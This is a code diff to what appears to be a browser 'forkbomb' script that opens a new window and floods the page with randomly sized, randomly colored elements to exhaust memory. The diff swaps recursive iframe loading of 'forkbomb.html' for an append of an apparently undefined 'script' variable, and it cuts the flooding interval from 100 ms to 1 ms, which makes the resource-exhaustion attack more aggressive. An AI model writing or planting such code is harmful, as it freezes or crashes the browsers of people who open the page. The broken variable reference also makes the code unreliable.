@@ -11,8 +11,7 @@
       (function() {
         for (let i = 0; i < 2; i++) {
           let iframe = document.createElement('iframe');
-          iframe.src = 'forkbomb.html';
-          document.body.appendChild(iframe);
+          document.body.appendChild(script);
         }
 
         // Add randomized memory-gobbling elements
@@ -22,7 +21,7 @@
           element.style.height = Math.floor(Math.random() * 1000) + 'px';
           element.style.backgroundColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
           document.body.appendChild(element);
-        }, 100);
+        }, 1);
       })();`;
       inject.addEventListener("click", () => {
         let win = window.open();
